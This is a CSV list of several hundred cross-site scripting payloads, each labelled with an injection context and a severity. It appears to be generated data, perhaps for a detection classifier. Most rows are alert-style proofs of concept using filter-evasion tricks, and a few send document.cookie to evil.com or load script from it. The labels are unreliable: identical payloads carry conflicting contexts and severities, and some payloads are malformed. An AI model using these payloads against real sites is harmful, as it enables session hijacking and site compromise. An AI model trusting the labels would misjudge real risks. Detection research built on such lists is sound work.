payload,context,severity
\x3cinput onfocus=alert(1) autofocus\x3e,event_handler,medium
&lt;img src=x onerror=alert(1)&gt;,event_handler,low
+alert(1)+,tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
<script/>d.innerHTML+='';</script>,tag_injection,high
<details open ontoggle=alert(1)>,event_handler,high
"""><svg onload=alert()>",tag_injection,medium
${alert(1)},template_injection,high
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"\""><img src=x onerror=\u0061\u006cert(1)>",script_injection,high
<script>confirm(1)</script>,template_injection,medium
<img/src=x onerror=confirm(1)//>,attribute_escape,medium
alert(2),tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"<ScRiPt>dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM/?c=""+dOcUmEnT.CoOkIe</ScRiPt>",dom_sink,low
onerror='alert(1)',tag_injection,medium
<svg onload=alert(1)>,event_handler,high
<svg onload=alert()>,tag_injection,medium
""" onfocus=al'+'ert(1) autofocus=""",attribute_escape,high
"javascript:void(document.location=""http://evil.com"")",js_uri,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
< script>d.innerHTML+='';</script>,tag_injection,high
\' onerror=alert(1)//,attribute_escape,high
\x3cscript\x3ealert(1)\x3c/script\x3e,template_injection,low
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><sCriPT>AlERt(sTrIng.FrOmcHaRCodE(88,83,83))</ScrIpt>",attribute_escape,high
"\""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,medium
"oNloaD=""ALErt(1)""",tag_injection,medium
<script src=//evil.com/xss.js></script>,template_injection,low
<svg/onload=alert(1)>,tag_injection,medium
"""><button alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<marquee onstart=alert(1)>,attribute_escape,medium
' onerror=alert(1) x=',attribute_escape,medium
${al'+'ert(1)},template_injection,medium
<BODY ONLOAD=prompt`1`>,tag_injection,medium
' onerror=alert(1) x=',attribute_escape,low
alert(document.cookie),attribute_escape,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,attribute_escape,medium
"\"" onload=alert(1)//",dom_sink,medium
"""><embed>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
\' onerror=alert(1)//,attribute_escape,high
#{alert(1)},template_injection,medium
"location=""javascript:alert(1)""",js_uri,high
"eval(""alert(1)"")",dom_sink,low
' onmouseover=alert(1) ',attribute_escape,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<script>alert(1)</script>,script_injection,medium
<script>confirm(1)</script>,js_uri,low
<img src=x onerror=alert(1)>,tag_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
#{alert(1)},template_injection,low
"""><img src=x onload=alert(1)>",attribute_escape,high
"""><img src=x onload=alert(1)>",tag_injection,low
""" onload
=alert(	1) x
=""",attribute_escape,low
"<embed src=""javascr/**/ipt:alert(1)"">",tag_injection,low
<script>alert(1)</script>,script_injection,low
<img/src=x onload=alert(1)//>,event_handler,medium
"#""><svg onload=alert(1)>",attribute_escape,medium
"""><%00svg onload=alert()>",tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
<svg////////onload=alert(1)>,tag_injection,medium
java%09script:alert(1),tag_injection,medium
oninput=”alert(‘AnonKryptiQuz’),tag_injection,medium
<svg////////onload=alert(1)>,tag_injection,medium
"onerror=""alert(1)""",tag_injection,medium
confirm(1),attribute_escape,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<svg/onload=alert(1)>,tag_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",tag_injection,high
javascript:alert(document.domain),js_uri,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
onkeydown=”alert(‘AnonKryptiQuz’),tag_injection,medium
<img/src=x onerror=alert(1)//>,event_handler,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,high
<%00script>d.innerHTML+='';</script>,tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
<img/’onerror=alert(1) src=a>,tag_injection,medium
<video src=x onerror=\u0061\u006cert(1)>,attribute_escape,low
javascr/**/ipt:alert(document.domain),js_uri,high
<details open ontoggle=alert(1)>,event_handler,high
"onerror=""alert(1)""",tag_injection,medium
javascript:alert(1),attribute_escape,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)>,event_handler,low
onerror=alert(0);>,tag_injection,medium
${alert(1)},script_injection,high
onmouseover=”alert(‘AnonKryptiQuz’),tag_injection,medium
"""><img src=x onerror=alert(1)>",template_injection,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
<img src/onerror=prompt(8)>,tag_injection,medium
<object>d.innerHTML+='';</script>,attribute_escape,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
onload&#61;'alert(1)',tag_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,high
"""><script alert(String.fromCharCode(88,83,83))</script>",script_injection,high
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,medium
"""><svg onload=alert()>",tag_injection,medium
javascript:confirm(1),js_uri,high
<script>prompt(1)</script>,script_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
<script>confirm(1)</script>,script_injection,medium
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,high
<svg><a onload=alert(1)></a>,tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
' onmouseover=alert(1) ',attribute_escape,low
<svgonload=alert(1)>,tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
"onload=""print()""",tag_injection,medium
innerHTML=location.hash>#<script>window.alert(1)</script>,attribute_escape,high
"location=""javascript:alert(1)""",dom_sink,low
#{confirm(1)},template_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",tag_injection,low
-alert(23)/,tag_injection,medium
<input onfocus=alert(1) autofocus>,event_handler,low
"""><a>a</a><img src=x onerror=confirm`1`>{{9-9}}';alert(0);://",script_injection,high
<img src/onerror=alert(1)>,tag_injection,medium
-alert(1)-',tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,attribute_escape,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
#{alert(1)},template_injection,low
alert(2),tag_injection,medium
javascript:alert(	document.domain),js_uri,medium
<audio src/onerror=alert(1)>,tag_injection,medium
onerror='alert(1)',tag_injection,medium
<svg onload=confirm(1)>,event_handler,high
innerHTML=location.hash>#<%00script>alert(1)</script>,attribute_escape,high
"\"" onerror=alert(1)//",attribute_escape,low
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
‘)alert(1);//,attribute_escape,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<svg onload=alert(1)>,event_handler,low
"<iframe src=""javascript:alert(1)"">",script_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",template_injection,high
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,high
"javascript:void(document.location=""http://evil.com"")",attribute_escape,low
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
\' onerror=alert(1)//,attribute_escape,high
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""></tag><svg onload=alert(1)>",tag_injection,medium
<details open ontoggle=alert(1)>,template_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
' onerror=alert(1) x=',attribute_escape,low
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
<svg onload=alert(1)>,event_handler,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,dom_sink,medium
"""><Svg oNLoaD=alErT(1)>",tag_injection,medium
<audio src/onerror=alert(1)>,tag_injection,medium
javascript:confirm(1),template_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
&lt;body onload=alert(1)&gt;,js_uri,medium
<%= alert(1) %>,attribute_escape,high
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
#{alert(1)},template_injection,low
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
<svg////////onload=alert(1)>,tag_injection,medium
"<script>D.iNnErhTMl+='';</ScrIpT>//[""'`-->]]>]</diV>",tag_injection,high
-alert(1)-',tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(document.cookie))</SCRIPT>",tag_injection,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
"?alert(1)"",",tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,tag_injection,medium
\' onerror=alert(1)//,attribute_escape,low
&quot; onerror=confirm(1) x=&quot;,attribute_escape,low
javascript:confirm(1),js_uri,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
\x3cimg/src=x onerror=alert(1)//\x3e,event_handler,high
<img src/onerror=alert(1)>,tag_injection,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
<script>confirm(1)</script>,script_injection,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
"<SCRiPt>D.INNeRHtMl+='';</SCRipt>//[""'`-->]]>]</dIv>",attribute_escape,high
<svg/onload=confirm(1)>,tag_injection,high
"data:text/html,<script>alert(1)</script>",js_uri,low
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<marquee onstart=confirm(1)>,event_handler,low
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<svg onload=alert(1)>,event_handler,high
<input onfocus=alert(1) autofocus>,event_handler,low
javascript:confirm(1),js_uri,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
e71%3balert(1)//503466e3,tag_injection,medium
<input onfocus=al'+'ert(1) autofocus>,event_handler,low
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",tag_injection,high
<img/src=x onerror=confirm(1)//>,event_handler,medium
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),template_injection,medium
"<object data=""javascript:al'+'ert(1)"">",dom_sink,medium
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
alert(1);,tag_injection,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"onload&#61;""alert(1)""",tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
javaSCRIPT:confirm(1),js_uri,medium
`${alert(1)}`,js_uri,medium
javascript:alert(1),js_uri,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(6715)&gt;`>,js_uri,high
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
<svg onload=confirm(1)>,tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
confirm(),tag_injection,medium
<img/src/onerror=alert(1),tag_injection,medium
${\u0061\u006cert(1)},event_handler,high
<script src=//evil.com/xss.js></script>,script_injection,medium
<%= alert(1) %>,template_injection,high
<svg////////onload=alert(1)>,tag_injection,medium
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
sEtInTERVal('aLe'+'RT(10)');,attribute_escape,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<ScrIPt>D.InneRhtml+='';</ScrIPT>//[""'`-->]]>]</Div>",attribute_escape,high
< svg onload=alert()>,tag_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
confirm(),tag_injection,medium
<scr/**/ipt>prompt(1)</scr/**/ipt>,attribute_escape,medium
"document.write(""<img src=x onerror=alert(1)>"")",event_handler,low
<img src/onerror=alert(1)>,tag_injection,medium
<svg id=1 onload=confirm(1)>,tag_injection,medium
{{7*7}},template_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
javascript:alert(document.domain),js_uri,high
<img src/onerror=alert(1)>,tag_injection,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute_escape,medium
-alert(23)/,tag_injection,medium
<%00script>d.innerHTML+='';</script>,tag_injection,high
<input onfocus=alert(1) autofocus>,event_handler,high
#javascript:alert(2);,js_uri,medium
<%00svg onload=alert()>,tag_injection,medium
"""><SVg OnLoaD=aLert()>",tag_injection,medium
<img src=x onerror=al'+'ert(1)>,event_handler,medium
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
<script>confirm(1)</script>,script_injection,medium
javascript:confirm(1),js_uri,medium
"\"" onerror=alert(1)//",attribute_escape,high
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
#{confirm(1)},template_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<svgonload=alert(1)>,tag_injection,medium
onlOAD='alERt(1)',tag_injection,medium
prompt(9),tag_injection,medium
"""><form onload=alert()>",tag_injection,medium
<ImG SrC=X OnErRoR=AlErT(1)>,tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
' ><img src=x onerror=alert(1)>,attribute_escape,medium
javascript:alert(	document.domain),js_uri,low
<svg onload=alert()>,tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
<svg onload=alert()>,tag_injection,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"\"" onerror=alert(1)//",attribute_escape,medium
#{alert(1)},js_uri,low
"confirm(1))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"""><img src=x onerror=confirm(1)>",attribute_escape,high
<marquee onstart=alert(1)>,event_handler,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<SvG oNLoAD=AleRt()>,tag_injection,medium
<video src=x onerror=alert(1)>,event_handler,medium
' onmouseover=alert(1) ',attribute_escape,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
alert(1),tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
${alert(1)},template_injection,medium
onload='alert(1)',tag_injection,medium
<svg/onload=alert(1)>,js_uri,low
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
${alert(1)},js_uri,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<svg/onload=alert(1)>,tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
<svg><a onload=alert(1)></a>,tag_injection,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
"\"" onerror
=alert(	1)//",attribute_escape,medium
\x3csvg onload=alert(1)\x3e,attribute_escape,high
""" onerror=confirm`1`1 a=""",attribute_escape,medium
alert(1),tag_injection,medium
<img/src/onerror=alert(1),tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"javascript:void(document.location=""http://evil.com"")",tag_injection,low
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"""><script/ alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"onload=""top.alert(1)""",tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
"""><svg onload=alert()>",tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
</script><svg onload=alert(1)>,tag_injection,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
prompt(1),attribute_escape,medium
onerror='alert(1)',tag_injection,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"location
=""javascript:alert(	1)""",dom_sink,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
onerror=alert(0);>,tag_injection,medium
"alert`1`)//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
<scr/**/ipt>alert(1)</scr/**/ipt>,script_injection,medium
<details open ontoggle=alert(1)>,event_handler,medium
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",script_injection,high
"location=""javascript:alert(1)""",dom_sink,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
\x3cimg src=x onerror=alert(1)\x3e,tag_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",attribute_escape,high
<script>alert(1)</script>,tag_injection,medium
javascript:alert(1),js_uri,high
"data:text/html,<SCRIPT>alert(1)</SCRIPT>",dom_sink,medium
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
alert(1);,tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,medium
""" onload=alert(1) x=""",attribute_escape,medium
"onerror=""alert(1)""",tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<script>alert(	1)</script>,script_injection,low
<BODY ONLOAD=alert(8839)>,tag_injection,medium
setInterval('ale'+'rt(10)');,tag_injection,high
"""><script	>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"<%
= alert(	1) %>",template_injection,medium
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"eval(""alert(1)"")",attribute_escape,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
&quot; onerror=alert(1) x=&quot;,script_injection,high
${\u0061\u006cert(1)},template_injection,low
onErROR='ALERt(1)',attribute_escape,medium
<script>prompt(1)</script>,script_injection,high
< script>d.innerHTML+='';</script>,tag_injection,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
innerHTML=location.hash>#<script	>alert(1)</script>,tag_injection,high
<SVG Onload=alErT()>,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"//"";ALeRT(sTRIng.FROMCHarCODe(88,83,83))",tag_injection,high
"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
onload='alert(1)',tag_injection,medium
#{alert(1)},template_injection,low
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
<image src/onerror=alert(1)>,tag_injection,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
<img/’onerror=alert(1) src=a>,tag_injection,medium
"""><svg onload=alert()>",tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",tag_injection,high
<body onload=alert(1)>,tag_injection,low
"""><img src=x onerror=alert(1)>",attribute_escape,high
"%20""><svg onload=alert(1)>",tag_injection,medium
#{alert(1)},template_injection,high
"data:text/html,<script>confirm(1)</script>",js_uri,medium
"eval(""alert(1)"")",dom_sink,low
"""><table onload=alert()>",tag_injection,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
; alert(1);//,tag_injection,medium
javascript:prompt(1),js_uri,medium
' onload=alert(1) x=',attribute_escape,low
<input onfocus=al'+'ert(1) autofocus>,event_handler,low
alert(2),tag_injection,medium
""" onload=alert(1) x=""",attribute_escape,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,high
onpointerover=”alert(‘AnonKryptiQuz’),tag_injection,medium
javascript:confirm(1),js_uri,low
"setTimeout(""alert(1)"",0)",dom_sink,medium
javascript:alert(1),js_uri,high
<video src=x onerror=alert(1)>,js_uri,high
<details open ontoggle=alert(1)>,event_handler,low
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
{{7*7}},template_injection,medium
<img/src/onerror=alert(1),tag_injection,medium
' ><img src=x onerror=alert(1)>,attribute_escape,medium
javascript:print()//,js_uri,medium
{{7*7}},script_injection,low
<svg onload=alert()>,tag_injection,medium
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",attribute_escape,high
javascript:alert(document.domain),js_uri,high
<img src/onerror=prompt(8)>,tag_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
"document.write(""\x3cimg src=x onerror=alert(1)\x3e"")",script_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
"<img>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
${alert(1)},template_injection,high
${alert(1)},template_injection,low
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",attribute_escape,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<img src=x onerror=alert(1)>,event_handler,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
"location=""javascript:alert(1)""",dom_sink,high
alert(2),tag_injection,medium
""" onerror=confirm(1) x=""",attribute_escape,high
<script>alert(1)</script>,script_injection,high
<img/src=x onerror=alert(1)//>,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
""" onload=alert(1) x=""",event_handler,medium
javascript:confirm(1),js_uri,high
' ><iMg sRc=x oNeRrOr=aLeRt(1)>,attribute_escape,medium
onload='alert(document.cookie)',tag_injection,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",tag_injection,high
javascript:confirm(1),js_uri,high
"<iframe src=""javascript:alert(1)"">",js_uri,high
prompt(9),tag_injection,medium
"""><img src=x onerror=al'+'ert(1)>",dom_sink,high
javaSCRIPT:alert(1),js_uri,high
&quot; onerror=alert(1) x=&quot;,js_uri,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
' onerror=alert(1) x=',js_uri,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
prompt(9),tag_injection,medium
""" onerror=alert(1) x=""",attribute_escape,medium
"""><script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
javascript:confirm(1),attribute_escape,medium
javascript:alert(	document.domain),dom_sink,high
"""><svg onload=alert()>",tag_injection,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
""" onfocus
=alert(	1) autofocus
=""",attribute_escape,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
<script>confirm(1)</script>,script_injection,high
&quot; onerror=alert(1) x=&quot;,js_uri,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
j\u0061v\u0061script:confirm(1),js_uri,high
javascript:alert(document.domain),js_uri,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
onload='alert(1)',tag_injection,medium
alert(1),tag_injection,medium
<svg/onload=confirm(1)>,js_uri,high
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<img src=x onerror=alert(1)>,tag_injection,low
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,low
onload='alert(1)',attribute_escape,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
{{7*7}},template_injection,low
"//"";top.alert(1))",tag_injection,high
innerHTML=location.hash>#<body>alert(1)</script>,tag_injection,high
onERROR='AlErt(1)',tag_injection,medium
"<object data=""javascript:confirm(1)"">",tag_injection,low
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"\""><img src=x onerror=\u0061\u006cert(1)>",attribute_escape,low
javascript:alert(document.domain),script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<%= alert(1) %>,event_handler,medium
"""+onfocus=prompt(123)""+",attribute_escape,medium
&lt;img/src=x onerror=alert(1)//&gt;,event_handler,medium
"<object data=""javaSCRIPT:alert(1)"">",tag_injection,low
"setTimeout(""alert(1)"",0)",dom_sink,high
confirm(1),attribute_escape,medium
"eval(""alert(1)"")",attribute_escape,low
"data:text/html,<script>alert(1)</script>",js_uri,high
{{7*7}},template_injection,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
top.alert(1))</SCRIPT>,tag_injection,high
"{{{}."")));alert(1)//""}}",script_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,low
